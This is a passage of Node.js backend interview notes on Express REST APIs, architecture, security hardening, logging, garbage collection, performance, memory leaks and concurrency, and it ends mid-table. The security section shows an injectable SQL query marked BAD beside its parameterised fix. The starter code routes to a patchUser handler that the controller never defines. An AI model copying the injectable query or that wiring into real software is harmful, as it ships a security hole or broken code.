A **REST API** (Representational State Transfer) exposes resources via URLs and uses HTTP methods to operate on them:

| Method | Purpose | Example |
| --- | --- | --- |
| GET | Read | `GET /users` or `GET /users/:id` |
| POST | Create | `POST /users` |
| PUT | Replace/Update | `PUT /users/:id` |
| PATCH | Partial update | `PATCH /users/:id` |
| DELETE | Remove | `DELETE /users/:id` |

### Key REST Principles

- **Resources over actions** — use nouns (`/users`), not verbs (`/getUsers`).
- **Statelessness** — each request contains all info needed; no server-side session state tied to the protocol.
- **Appropriate status codes** — `200`, `201`, `400`, `401`, `403`, `404`, `500`, etc.
- **Consistent structure** — predictable URLs, response shapes.

### Project Structure (Recommended)

`src/
├── app.js              # Express setup
├── server.js           # Starts the server
├── routes/
│   └── userRoutes.js
├── controllers/
│   └── userController.js
├── services/
│   └── userService.js
├── models/
│   └── userModel.js
├── middlewares/
│   ├── errorHandler.js
│   └── validate.js
└── utils/`

### Complete Example

**`app.js`**

```jsx
const express = require('express');
const userRoutes = require('./routes/userRoutes');
const errorHandler = require('./middlewares/errorHandler');

const app = express();

app.use(express.json());              // parse JSON bodies
app.use(express.urlencoded({ extended: true }));

app.use('/api/v1/users', userRoutes); // versioned API

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Route not found' });
});

// Centralized error handler (must be last)
app.use(errorHandler);

module.exports = app;
```

**`routes/userRoutes.js`**

```jsx
const express = require('express');
const userController = require('../controllers/userController');

const router = express.Router();

router.get('/', userController.getAllUsers);
router.get('/:id', userController.getUserById);
router.post('/', userController.createUser);
router.put('/:id', userController.updateUser);
router.patch('/:id', userController.patchUser);
router.delete('/:id', userController.deleteUser);

module.exports = router;
```

`controllers/userController.js`

```jsx
const userService = require('../services/userService');

exports.getAllUsers = async (req, res, next) => {
  try {
    const users = await userService.findAll();
    res.status(200).json({ success: true, data: users });
  } catch (err) {
    next(err);
  }
};

exports.getUserById = async (req, res, next) => {
  try {
    const user = await userService.findById(req.params.id);
    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }
    res.status(200).json({ success: true, data: user });
  } catch (err) {
    next(err);
  }
};

exports.createUser = async (req, res, next) => {
  try {
    const newUser = await userService.create(req.body);
    res.status(201).json({ success: true, data: newUser });
  } catch (err) {
    next(err);
  }
};

exports.updateUser = async (req, res, next) => {
  try {
    const updated = await userService.update(req.params.id, req.body);
    res.status(200).json({ success: true, data: updated });
  } catch (err) {
    next(err);
  }
};

exports.deleteUser = async (req, res, next) => {
  try {
    await userService.remove(req.params.id);
    res.status(204).send();
  } catch (err) {
    next(err);
  }
};
```

**`middlewares/errorHandler.js`**

```jsx
module.exports = (err, req, res, next) => {
  console.error(err);
  const status = err.statusCode || 500;
  res.status(status).json({
    success: false,
    error: err.message || 'Internal Server Error',
  });
};
```

**`server.js`**

```jsx
const app = require('./app');
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => console.log(`Server on port ${PORT}`));
```

### Best Practices

- **Version your API** (`/api/v1/...`) so you can evolve without breaking clients.
- **Use proper status codes** — `201 Created`, `204 No Content`, `400 Bad Request`, etc.
- **Consistent response shape** — e.g., always `{ success, data, error }`.
- **Pagination** for list endpoints — `GET /users?page=2&limit=20`.
- **Filtering & sorting** via query params — `GET /users?role=admin&sort=createdAt`.
- **Input validation** on every write endpoint (covered in Q8).
- **Centralized error handling** — one middleware catches all errors.
- **Async error handling** — either `try/catch` or a wrapper like `express-async-handler`.

### Summary

> Build RESTful APIs in Express by organizing code into **routes, controllers, and services**, using **HTTP methods and status codes correctly**, and applying principles like **resource-based URLs, versioning, pagination, centralized error handling, and consistent response shapes**. Use `express.Router()` to modularize routes, and always have a global error-handling middleware at the bottom of your middleware chain.
> 

1. What is the difference between MVC and layered architecture in backend apps?

### Detailed Explanation

Both are ways to organize code — they're **not mutually exclusive** and are often used together. The difference is what concerns they separate.

### MVC (Model-View-Controller)

MVC is a **UI-centric pattern**. It splits an application into three roles:

- **Model** — data and business logic (e.g., a `User` model with validation)
- **View** — presentation layer (HTML templates, or in a REST API, the JSON response shape)
- **Controller** — receives input, coordinates Model and View, returns a response

`[ Client ] → Controller → Model → Database
                     ↓
                    View (response)`

**Typical MVC structure:**

`src/
├── models/
│   └── User.js
├── views/
│   └── userView.ejs
└── controllers/
    └── userController.js`

**Controller example:**

```jsx
// controllers/userController.js — doing TOO much
exports.createUser = async (req, res) => {
  const { email, password } = req.body;

  if (!email.includes('@')) return res.status(400).send('Invalid email');
  const hashed = await bcrypt.hash(password, 10);
  const existing = await User.findOne({ email });
  if (existing) return res.status(409).send('User exists');
  const user = await User.create({ email, password: hashed });
  await sendWelcomeEmail(user.email);
  res.status(201).json(user);
};
```

**The problem:** controllers often become dumping grounds with DB queries, validation, external API calls, and business rules all mixed together.

### Layered Architecture

Layered architecture separates concerns by **technical responsibility**, with each layer only talking to the layer directly beneath it.

`┌──────────────────────────────┐
│  Presentation (Controllers)  │  ← routes, HTTP concerns
├──────────────────────────────┤
│  Service / Business Logic    │  ← orchestrates business rules
├──────────────────────────────┤
│  Repository / Data Access    │  ← DB queries, ORM calls
├──────────────────────────────┤
│  Database                    │
└──────────────────────────────┘`

**Typical structure:**

`src/
├── controllers/
├── services/
├── repositories/
└── models/`

**Split example:**

javascript

```jsx
// controllers/userController.js — thin
exports.createUser = async (req, res, next) => {
  try {
    const user = await userService.register(req.body);
    res.status(201).json(user);
  } catch (err) {
    next(err);
  }
};

// services/userService.js — business logic
const userRepo = require('../repositories/userRepository');
const bcrypt = require('bcryptjs');
const emailService = require('./emailService');

exports.register = async ({ email, password }) => {
  if (await userRepo.findByEmail(email)) {
    throw new Error('User already exists');
  }
  const hashed = await bcrypt.hash(password, 10);
  const user = await userRepo.create({ email, password: hashed });
  await emailService.sendWelcome(user.email);
  return user;
};

// repositories/userRepository.js — DB only
const User = require('../models/User');
exports.findByEmail = (email) => User.findOne({ email });
exports.create = (data) => User.create(data);
```

**Key Differences:**

| Aspect | MVC | Layered Architecture |
| --- | --- | --- |
| Focus | UI/interaction split | Technical responsibility split |
| Origin | UI/desktop apps (Smalltalk) | Enterprise backends |
| Layers | 3 roles (M, V, C) | Usually 3–5 layers |
| View relevance | Explicit view layer | No view; just data layers |
| Testability | Controllers are hard to test | Services easily unit-tested |
| Common in | Rails, Laravel, ASP.NET MVC | Spring Boot, NestJS, DDD apps |

### They Work Together

Most modern Node.js apps use **MVC + layered together**:

`Controller (Presentation layer)
    ↓
Service (Business layer)
    ↓
Repository (Data-access layer)
    ↓
Model (ORM entity)`

Here the "Controller" of MVC becomes just the thin presentation layer; real work moves into services and repositories.

### When to Use Which

- **Pure MVC** — small apps, server-rendered pages, fast prototypes.
- **Layered** — larger apps, complex business rules, multiple data sources, microservices.
- **MVC + Layered** — the sweet spot for medium-to-large REST APIs.

### Summary

> **MVC** splits an app by UI roles (Model, View, Controller) and is great for simple apps but tends to put too much into controllers. **Layered architecture** splits by technical concerns (Presentation → Service → Repository → DB), making code more testable and scalable. They aren't opposites — a typical Node.js REST API uses **thin MVC controllers on top of a layered service/repository structure**, getting the best of both.
> 

1. What are some best practices for securing a Node.js application?

### Detailed Explanation

Security is about defense in depth — no single measure is enough. Here are the most important practices for Node.js/Express apps.

### 1. Set Secure HTTP Headers with Helmet

bash

`npm install helmet`

`const helmet = require('helmet');
app.use(helmet());`

Helmet sets headers like `Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, `X-Content-Type-Options`, etc., to protect against XSS, clickjacking, and MIME sniffing.

### 2. Configure CORS Carefully

bash

`npm install cors`

`const cors = require('cors');

app.use(cors({
  origin: ['https://myapp.com', 'https://admin.myapp.com'], // explicit whitelist
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
}));`

Never use `origin: '*'` for authenticated APIs.

### 3. Validate and Sanitize All Input

Covered in Q8. Assume every input is malicious.

### 4. Rate Limiting & Brute-Force Protection

Covered in Q3. Essential for login, signup, and public APIs.

### 5. Use HTTPS Everywhere

- Serve over HTTPS in production (TLS certificates from Let's Encrypt are free).
- Redirect HTTP → HTTPS.
- Use `Strict-Transport-Security` header (included in Helmet).
- Set cookies as `Secure` and `HttpOnly`.

javascript

`app.use(session({
  cookie: { secure: true, httpOnly: true, sameSite: 'strict' },
}));`

### 6. Secure Authentication & Authorization

- Hash passwords with **bcrypt** (cost factor 10+) or **argon2**.
- Use **JWT with short expiration + refresh tokens** (Q6).
- Implement **role-based access control (RBAC)**:

```jsx
const authorize = (...roles) => (req, res, next) => {
  if (!roles.includes(req.user.role)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
};

app.delete('/users/:id', authenticate, authorize('admin'), deleteUser);
```

- Enable **2FA** for sensitive accounts.

### 7. Manage Secrets Properly

- **Never commit secrets** to git. Use `.env` files (with `.gitignore`) in dev.
- In production, use a secrets manager: **AWS Secrets Manager**, **HashiCorp Vault**, **Azure Key Vault**, or Kubernetes Secrets.

```jsx
require('dotenv').config();
const dbPassword = process.env.DB_PASSWORD;
```

### 8. Keep Dependencies Updated & Audited

bash

`npm audit
npm audit fix`

Tools like **Snyk**, **Dependabot**, and **Socket.dev** automate vulnerability scanning.

- Use `npm ci` in production builds (exact `package-lock.json`).
- Pin versions; don't rely on `^` ranges blindly for critical deps.
- Remove unused dependencies — each one is an attack surface.

### 9. Prevent SQL and NoSQL Injection

- **Use parameterized queries / ORMs** — never concatenate user input into queries.

```jsx
// BAD
db.query(`SELECT * FROM users WHERE email = '${email}'`);

// GOOD
db.query('SELECT * FROM users WHERE email = ?', [email]);

// ORM (Sequelize, Prisma, Mongoose) — safe by default
User.findOne({ where: { email } });
```

- For MongoDB, use `express-mongo-sanitize` (Q8).

### 10. Prevent XSS

- Escape user content in templates.
- Use `Content-Security-Policy` headers (via Helmet).
- Use **DOMPurify** for any HTML-rendered user content.
- Set cookies as `HttpOnly` so JavaScript can't read them.

### 11. Prevent CSRF

For cookie-based session apps, use CSRF tokens:

bash

`npm install csurf`

javascript

`const csrf = require('csurf');
app.use(csrf({ cookie: true }));`

(For JWT-in-header APIs, CSRF is generally not a concern since browsers don't auto-send Authorization headers.)

### 12. Don't Leak Error Details

In production, never send stack traces or DB errors to clients:

```jsx
app.use((err, req, res, next) => {
  logger.error(err);
  const msg = process.env.NODE_ENV === 'production'
    ? 'Internal Server Error'
    : err.message;
  res.status(err.status || 500).json({ error: msg });
});
```

Also disable the `X-Powered-By` header (Helmet does this by default):

`app.disable('x-powered-by');`

### 13. Limit Request Body Size

javascript

`app.use(express.json({ limit: '10kb' })); // reject huge JSON payloads`

Prevents payload-based DoS.

### 14. Secure File Uploads

- Validate file type and size.
- Store uploads **outside the web root** or in object storage (S3).
- Use random filenames; never trust the client-supplied name.
- Scan for malware if user-facing.

### 15. Use a Process Manager

Use **PM2**, **systemd**, or a container orchestrator to:

- Auto-restart on crash
- Run as a non-root user
- Limit resource usage

### 16. Run as a Non-Root User

Inside Docker:

dockerfile

`FROM node:20-alpine
RUN addgroup app && adduser -S -G app app
USER app`

### 17. Monitor for Suspicious Activity

Log and alert on:

- Failed login spikes
- Unusual 4xx/5xx patterns
- Access to admin endpoints from unexpected IPs
- Huge request payloads

### 18. Prevent Prototype Pollution

Avoid merging untrusted JSON into objects without protection. Use libraries like `lodash.merge` cautiously, or use `Object.create(null)` for maps of user data.

### Consolidated Example: A Hardened Express Setup

```jsx
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const mongoSanitize = require('express-mongo-sanitize');
const xss = require('xss-clean');
const compression = require('compression');
require('dotenv').config();

const app = express();

app.disable('x-powered-by');
app.set('trust proxy', 1);

app.use(helmet());
app.use(cors({ origin: process.env.ALLOWED_ORIGIN, credentials: true }));
app.use(express.json({ limit: '10kb' }));
app.use(mongoSanitize());
app.use(xss());
app.use(compression());

app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));

// ... routes ...

app.use((err, req, res, next) => {
  const msg = process.env.NODE_ENV === 'production' ? 'Server error' : err.message;
  res.status(err.status || 500).json({ error: msg });
});

app.listen(process.env.PORT || 3000);
```

### Summary

> Node.js security is about **layered defenses**: use **Helmet** for secure headers, **CORS whitelisting**, **input validation**, **rate limiting**, **HTTPS**, **bcrypt for passwords**, **parameterized queries/ORMs**, **HttpOnly + Secure cookies**, **CSP to prevent XSS**, **CSRF tokens for cookie-based auth**, **secrets in environment variables or secret managers**, **`npm audit` + Dependabot**, and **generic error messages in production**. Run as a non-root user, limit request size, keep dependencies patched, and log/monitor for anomalies. No single measure is enough — combine them all.
> 

1. How do you handle logging and monitoring in a Node.js production environment?

### Detailed Explanation

Logging and monitoring are two different but related concerns:

- **Logging** — recording events (errors, requests, business actions) for debugging and auditing.
- **Monitoring** — collecting metrics (CPU, memory, request rates, latencies) and alerting on anomalies.

In production, `console.log` is not enough — you need **structured, leveled, centralized logging** plus real-time metrics.

### Logging: Winston (Classic Choice)

bash

`npm install winston`

```jsx
const winston = require('winston');

const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json() // structured JSON logs
  ),
  defaultMeta: { service: 'user-api' },
  transports: [
    new winston.transports.Console(),
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' }),
  ],
});

logger.info('Server started', { port: 3000 });
logger.error('DB connection failed', { error: err.message, stack: err.stack });
```

### Logging: Pino (Faster, Modern)

Pino is significantly faster than Winston and is the default choice in many modern Node.js stacks (including NestJS and Fastify).

bash

`npm install pino pino-http`

```jsx
const pino = require('pino');
const pinoHttp = require('pino-http');

const logger = pino({
  level: process.env.LOG_LEVEL || 'info',
  transport: process.env.NODE_ENV !== 'production'
    ? { target: 'pino-pretty' }    // human-readable in dev
    : undefined,                    // raw JSON in prod
});

app.use(pinoHttp({ logger }));      // logs every HTTP request

app.get('/health', (req, res) => {
  req.log.info('Health check called');
  res.send('ok');
});
```

### Log Levels (Standard)

- `fatal` — app will crash
- `error` — handled failure that needs attention
- `warn` — concerning but not failing
- `info` — normal business events (startup, login)
- `debug` — detailed diagnostic info
- `trace` — very detailed step-by-step

### HTTP Request Logging with Morgan

bash

`npm install morgan`

```jsx
const morgan = require('morgan');

// Common production format: combined
app.use(morgan('combined', {
  stream: { write: (msg) => logger.info(msg.trim()) },
}));
```

### Structured Logging Best Practice

Always log **as structured JSON** with consistent fields — it makes logs searchable and queryable:

javascript

`logger.info({
  event: 'user.login',
  userId: user.id,
  ip: req.ip,
  durationMs: 47,
});`

This is far superior to `logger.info('User 123 logged in from 1.2.3.4 in 47ms')`, which is effectively unqueryable.

### Correlation IDs (Request Tracing)

To trace a single request through multiple services, assign a unique ID per request:

```jsx
const { v4: uuidv4 } = require('uuid');

app.use((req, res, next) => {
  req.id = req.headers['x-request-id'] || uuidv4();
  res.setHeader('X-Request-Id', req.id);
  next();
});

// Include req.id in every log line for that request
logger.info({ reqId: req.id, event: 'user.created' });
```

### Centralized Log Aggregation

In production, ship logs to a central system so you can search across servers:

- **ELK Stack** (Elasticsearch + Logstash + Kibana)
- **Grafana Loki**
- **Datadog**
- **Splunk**
- **AWS CloudWatch**
- **Google Cloud Logging**

### Monitoring & Metrics

### Prometheus + Grafana

bash

`npm install prom-client`

```jsx
const client = require('prom-client');

client.collectDefaultMetrics(); // CPU, memory, event loop lag, etc.

const httpRequestDuration = new client.Histogram({
  name: 'http_request_duration_seconds',
  help: 'HTTP request duration in seconds',
  labelNames: ['method', 'route', 'status'],
});

app.use((req, res, next) => {
  const end = httpRequestDuration.startTimer();
  res.on('finish', () => {
    end({ method: req.method, route: req.route?.path || 'unknown', status: res.statusCode });
  });
  next();
});

// Expose /metrics for Prometheus to scrape
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', client.register.contentType);
  res.end(await client.register.metrics());
});
```

APM (Application Performance Monitoring)

Full-stack APM tools trace requests end-to-end, show slow DB queries, track errors, and alert on anomalies:

- **New Relic**
- **Datadog APM**
- **Sentry** (focused on error tracking)
- **Dynatrace**
- **OpenTelemetry** (vendor-neutral standard)

### Sentry Example (Error Tracking)

`npm install @sentry/node`

```jsx
const Sentry = require('@sentry/node');

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  tracesSampleRate: 0.1,
});

app.use(Sentry.Handlers.requestHandler());
// ... your routes ...
app.use(Sentry.Handlers.errorHandler());
```

### Health Checks

Expose a `/health` (and optionally `/ready`) endpoint for load balancers and Kubernetes:

```jsx
app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }));

app.get('/ready', async (req, res) => {
  try {
    await db.ping();
    await redis.ping();
    res.status(200).json({ status: 'ready' });
  } catch (err) {
    res.status(503).json({ status: 'not ready', error: err.message });
  }
});
```

### Best Practices

- **Never log secrets** — passwords, tokens, PII, credit cards. Mask or redact them.
- **Use log levels properly** — don't make every log `info`.
- **Rotate log files** (with `winston-daily-rotate-file` or the OS `logrotate`).
- **Monitor event loop lag** — it indicates a blocked loop before users complain.
- **Alert on symptoms, not causes** — alert on high error rate or latency rather than CPU.
- **Capture unhandled errors** globally:

```jsx
process.on('uncaughtException', (err) => {
  logger.fatal({ err }, 'Uncaught exception');
  process.exit(1);
});
process.on('unhandledRejection', (err) => {
  logger.fatal({ err }, 'Unhandled rejection');
  process.exit(1);
});
```

### Summary

> Use **Pino** or **Winston** for structured JSON logging with log levels, **Morgan** or `pino-http` for HTTP request logs, and **correlation IDs** to trace requests. Ship logs to a central system like the **ELK Stack**, **Loki**, or **Datadog**. For monitoring, use **prom-client + Prometheus + Grafana** for metrics, **Sentry** for error tracking, and an **APM** (Datadog/New Relic/OpenTelemetry) for distributed tracing. Add **`/health` and `/ready` endpoints** for orchestration, and **never log sensitive data**.
> 

1. Explain how garbage collection works in Node.js

### Detailed Explanation

Node.js uses the **V8 JavaScript engine**, which includes an automatic **garbage collector (GC)** that frees memory used by objects no longer reachable from your program. As a developer, you don't manually free memory — V8 does it for you.

### Core Concept: Reachability

An object is **reachable** if you can access it from a "root" (global objects, the current call stack, closures, etc.) through references. Unreachable objects become **garbage** and are eligible for collection.

```jsx
let user = { name: 'Alice' }; // reachable via `user`
user = null;                  // no references left → eligible for GC
```

### V8's Generational Heap

V8 splits the heap into two main regions based on the **generational hypothesis**: *most objects die young*.

`┌─────────────────────────────────────────────┐
│               V8 Heap                        │
│                                              │
│  ┌──────────────┐   ┌───────────────────┐   │
│  │  Young Gen   │   │     Old Gen        │   │
│  │ (New Space)  │ → │  (Old Space)       │   │
│  │   ~1–8 MB    │   │   grows as needed  │   │
│  └──────────────┘   └───────────────────┘   │
└─────────────────────────────────────────────┘`

**1. Young Generation (New Space)**

- Small region (typically 1–8 MB per semi-space).
- Split into two equal halves: **From-space** and **To-space**.
- New objects allocate here.
- Collected by the **Scavenger** (Cheney's algorithm) — very fast.
- If an object survives two scavenges, it's promoted to the Old Generation.

**2. Old Generation (Old Space)**

- Holds objects that survived multiple young-gen collections.
- Collected by **Mark-Sweep-Compact** — slower but thorough.
- Objects here are assumed to be long-lived.

### The Two GC Algorithms

### Scavenge (Minor GC — Young Gen)

Runs frequently (every few seconds under normal load). Fast because the young gen is small.

1. New objects allocate in **From-space**.
2. When From-space fills up, live objects are copied to **To-space**.
3. Dead objects are abandoned (the whole From-space is treated as garbage).
4. Roles flip: To-space becomes the new From-space.
5. Objects that have survived twice get **promoted** to the Old Gen.

Typical pause: **< 1 ms**.

### Mark-Sweep-Compact (Major GC — Old Gen)

Runs less frequently but is more expensive.

1. **Mark** — traverse from roots, marking all reachable objects.
2. **Sweep** — free memory of unmarked (dead) objects.
3. **Compact** — move surviving objects together to reduce fragmentation.

Modern V8 uses **incremental and concurrent marking** to avoid long pauses — marking happens in small chunks between JS execution, and some phases run on background threads.

Typical pause: **10–100 ms** depending on heap size.

### Observing GC

```jsx
// Run with: node --trace-gc app.js
// Or programmatically:
console.log(process.memoryUsage());
/*
{
  rss: 32505856,        // Resident Set Size (total memory)
  heapTotal: 6537216,   // V8's allocated heap size
  heapUsed: 4325584,    // actually used in heap
  external: 8192,       // memory used by C++ objects tied to JS
  arrayBuffers: 16384
}
*/
```

Force a GC (only when Node started with `--expose-gc`):

`if (global.gc) global.gc();`

### Tuning Heap Size

Default old-gen limit is around **1.5 GB on 64-bit**. Increase it for memory-heavy apps:

bash

`node --max-old-space-size=4096 app.js   # 4 GB`

### Common Causes of GC Pressure

- **Unintentional globals** — never released.
- **Lingering closures** holding references to big objects.
- **Unbounded caches and arrays**.
- **Event listeners** that are never removed.
- **Timers (`setInterval`)** holding references.

### Best Practices

- Avoid keeping large objects in long-lived scopes.
- Use `WeakMap` / `WeakSet` when you want references that don't prevent GC.
- Null out large objects when done (`bigData = null`) — though usually scope-exit handles this.
- Stream large data rather than loading into memory.
- Profile with Chrome DevTools or `clinic.js` when in doubt.

### Summary

> Node.js garbage collection is handled by V8 using a **generational approach**: a small, fast **Young Generation** collected by the **Scavenger** and a larger **Old Generation** collected by **Mark-Sweep-Compact**. Most objects die young, so frequent cheap collections handle them; long-lived objects graduate to the old gen. Modern V8 uses **incremental and concurrent** techniques to minimize pauses. Developers don't manage memory manually but should avoid memory leaks (global refs, closures, caches, listeners) and can tune heap size with `--max-old-space-size`.
> 

1. How do you optimize a high-throughput API built with Node.js?

High-throughput means handling many requests per second with low latency. Optimization happens at multiple layers.

### Layer 1 — Process / Concurrency

- **Cluster or use a process manager**: a single Node process uses only one CPU core. Run N workers (one per core) with `cluster`, `pm2`, or container replicas behind a load balancer.
- **Pick the right framework**: Fastify is typically 2–3× faster than Express due to schema-based serialization and lower middleware overhead.

### Layer 2 — Event Loop Discipline

- Never use `Sync` APIs on a hot path.
- Offload CPU-heavy work (hashing, image processing, crypto) to **Worker Threads**.
- Keep per-request work small; long synchronous tasks stall all other requests on that worker.

### Layer 3 — I/O Optimization

- **Connection pooling** for databases (`pg.Pool`, `mysql2/pool`, `mongoose` defaults). Creating a new TCP + TLS handshake per query is extremely expensive.
- **HTTP Keep-Alive** for downstream services — set `http.Agent({ keepAlive: true })`.
- **Stream** large responses instead of buffering:

```jsx
// ❌ Buffers entire file in memory
app.get('/file', (req, res) => {
  const data = fs.readFileSync('big.csv');
  res.send(data);
});

// ✅ Streams to client
app.get('/file', (req, res) => {
  fs.createReadStream('big.csv').pipe(res);
});
```

### Layer 4 — Caching

- **In-memory cache** (LRU) for hot, small data.
- **Redis / Memcached** for shared cache across workers.
- **HTTP cache headers** (`Cache-Control`, `ETag`) to let clients and CDNs cache.
- **CDN** in front for static and cacheable API responses.

```jsx
const LRU = require('lru-cache');
const cache = new LRU({ max: 10_000, ttl: 30_000 });

app.get('/user/:id', async (req, res) => {
  const key = req.params.id;
  const cached = cache.get(key);
  if (cached) return res.json(cached);

  const user = await db.getUser(key);
  cache.set(key, user);
  res.json(user);
});
```

### Layer 5 — Payload & Protocol

- Enable **gzip/brotli** compression (at the CDN or via `compression` middleware — watch CPU cost).
- Use **HTTP/2** for multiplexing when you serve many small resources.
- Minimize JSON size: omit null fields, paginate lists, support partial responses.
- Use a **fast JSON serializer**: `fast-json-stringify` (used by Fastify) can be 2–5× faster than `JSON.stringify` when a schema is known.

### Layer 6 — Database

- Add indexes for every query path.
- Avoid N+1 queries — use joins, `IN (...)`, or DataLoader-style batching.
- Read replicas for read-heavy workloads.
- Use `EXPLAIN` to verify query plans.

### Layer 7 — Protect the System

- **Rate limit** (e.g., `express-rate-limit`, token bucket in Redis).
- **Circuit breakers** (`opossum`) to fail fast when a downstream is down.
- **Timeouts on every outbound call** so slow dependencies don't pile up sockets.
- **Backpressure** when consuming streams.

### Summary

Optimization is layered: scale across cores (cluster), keep the event loop free (async, worker threads for CPU), pool connections, cache aggressively (LRU, Redis, HTTP, CDN), stream big payloads, compress responses, tune DB queries, and protect the service with rate limiting, timeouts, and circuit breakers. Measure before and after each change — don't guess.

1. How would you handle a memory leak in a Node.js application?

A **memory leak** happens when an application holds references to objects it no longer needs, preventing the garbage collector (GC) from freeing them. Over time, memory usage grows until the process crashes with an `Out of Memory` error or the system slows dramatically due to long GC pauses.

### Common Causes

1. **Unintentional global variables** – forgetting `let`/`const` in non-strict mode.
2. **Closures holding references** – an inner function captures a large outer variable that never gets released.
3. **Event listeners never removed** – `emitter.on(...)` without a matching `off(...)`, often producing `MaxListenersExceededWarning`.
4. **Timers/intervals not cleared** – `setInterval` keeps its callback (and anything it closes over) alive forever.
5. **Unbounded caches / maps** – an in-memory cache (plain `Map`, object) that grows without eviction.
6. **Detached DOM-like references** – in Node it's typically streams, sockets, or buffers kept in arrays.
7. **Circular references with external resources** – e.g., a DB client holding a ref to the app holding a ref back.

### Step-by-Step Handling Approach

**Step 1 — Confirm the leak exists**

Use `process.memoryUsage()` and watch `heapUsed` and `rss` over time. A healthy app oscillates; a leaking app trends upward after each GC.

```jsx
setInterval(() => {
  const { rss, heapUsed, heapTotal, external } = process.memoryUsage();
  console.log({
    rss: (rss / 1024 / 1024).toFixed(2) + ' MB',
    heapUsed: (heapUsed / 1024 / 1024).toFixed(2) + ' MB',
    heapTotal: (heapTotal / 1024 / 1024).toFixed(2) + ' MB',
    external: (external / 1024 / 1024).toFixed(2) + ' MB',
  });
}, 5000);
```

**Step 2 — Reproduce under load**

Run a load test (e.g., `autocannon`, `k6`, `artillery`) against a single endpoint. Leaks usually show up clearly under sustained traffic.

**Step 3 — Capture heap snapshots**

Start the process with `--inspect` and use Chrome DevTools' Memory tab, **or** take snapshots programmatically:

```jsx
const v8 = require('v8');
const fs = require('fs');

function takeSnapshot(label) {
  const filename = `heap-${label}-${Date.now()}.heapsnapshot`;
  const stream = v8.getHeapSnapshot();
  stream.pipe(fs.createWriteStream(filename));
  console.log(`Snapshot written: ${filename}`);
}

// Take 3 snapshots spaced by load
takeSnapshot('baseline');
setTimeout(() => takeSnapshot('after-load-1'), 60_000);
setTimeout(() => takeSnapshot('after-load-2'), 120_000);
```

Load the snapshots into Chrome DevTools → Memory → Load. Use the **Comparison** view between snapshots and sort by "Delta" — objects that keep growing are your suspects.

**Step 4 — Use tooling to find the cause**

- **`clinic doctor`** – gives a high-level diagnosis (memory leak, event loop issue, GC pressure).
- **`clinic heapprofiler`** – identifies allocation hotspots.
- **`node --heap-prof`** – built-in heap profile output.
- **`node --trace-gc`** – prints every GC event.

**Step 5 — Fix common patterns**

```jsx
// ❌ Leak: listeners accumulate
function onRequest(req, res) {
  db.on('data', handler); // added every request, never removed
}

// ✅ Fix: scope the listener
function onRequest(req, res) {
  const handler = (d) => { /* ... */ };
  db.on('data', handler);
  res.on('close', () => db.off('data', handler));
}
```

```jsx
// ❌ Leak: unbounded cache
const cache = new Map();
function get(key, compute) {
  if (!cache.has(key)) cache.set(key, compute());
  return cache.get(key);
}

// ✅ Fix: bounded cache (e.g., LRU)
const LRU = require('lru-cache');
const cache = new LRU({ max: 1000, ttl: 60_000 });
```

### Diagram — Heap Growth Pattern

`Heap Used (MB)
   │
250│                                         ╱╲
   │                                 ╱╲    ╱   ← LEAKY: trend keeps climbing
200│                         ╱╲    ╱    ╲╱
   │                 ╱╲    ╱    ╲╱
150│         ╱╲    ╱    ╲╱
   │   ╱╲  ╱    ╲╱
100│  ╱  ╲╱
   │  ╱
 50│ ╱      ╱╲    ╱╲    ╱╲    ╱╲    ╱╲   ← HEALTHY: returns to baseline after GC
   │       ╱  ╲  ╱  ╲  ╱  ╲  ╱  ╲  ╱  ╲
  0└───────────────────────────────────────► time`

### Summary

- Confirm leak with `process.memoryUsage()` trending upward.
- Reproduce under load.
- Take and **compare** heap snapshots to identify retained objects.
- Use `clinic.js` and Chrome DevTools to find the allocation source.
- Fix root cause: remove listeners, clear timers, bound caches, avoid accidental globals.
- In production, add alerting on RSS/heap growth and GC time to catch leaks early.

1. **What are the trade-offs between child processes, worker threads, and clustering?**

All three exist to go beyond a single Node.js event loop, but they solve different problems.

### Child Processes (`child_process`)

- Spawn a **completely separate OS process** — can be another Node script or any executable (`python`, `ffmpeg`, etc.).
- **Independent memory**; communication via stdio or an IPC channel (when using `fork()`).
- Heaviest option (fresh V8, fresh event loop, fresh memory).
- Best for: running non-JS binaries, isolating crash-prone code, one-off tasks.

```jsx
const { fork } = require('child_process');
const child = fork('./heavy-script.js');
child.send({ task: 'process', data: [1, 2, 3] });
child.on('message', (result) => console.log('Got:', result));
```

### Worker Threads (`worker_threads`)

- Threads inside the **same process**, each with its own V8 instance and event loop.
- Can share memory via `SharedArrayBuffer` and transfer `ArrayBuffer`s with zero copy.
- Communication via `MessagePort` (`postMessage` / `on('message')`).
- Lighter than child processes; best for **CPU-bound JavaScript**.

```jsx
// main.js
const { Worker } = require('worker_threads');
const worker = new Worker('./hash-worker.js', { workerData: password });
worker.on('message', (hash) => console.log(hash));

// hash-worker.js
const { parentPort, workerData } = require('worker_threads');
const crypto = require('crypto');
const hash = crypto.pbkdf2Sync(workerData, 'salt', 100_000, 64, 'sha512');
parentPort.postMessage(hash.toString('hex'));
```

### Clustering (`cluster`)

- Built on top of `child_process.fork()`. Forks **N identical worker processes** and uses the OS to distribute incoming socket connections to them (round-robin by default on Linux).
- Each worker is a full Node.js process with its own memory; they share nothing except the listening port.
- Best for: **scaling an HTTP server across CPU cores**.

```jsx
const cluster = require('cluster');
const os = require('os');

if (cluster.isPrimary) {
  for (let i = 0; i < os.cpus().length; i++) cluster.fork();
  cluster.on('exit', (worker) => {
    console.log(`Worker ${worker.process.pid} died, restarting…`);
    cluster.fork();
  });
} else {
  require('./server'); // your express/fastify app
}
```

### Comparison Table

| Feature | Child Process | Worker Threads | Clustering |
| --- | --- | --- | --- |
| Isolation | Full OS process | Thread in same process | Full OS process (per worker) |
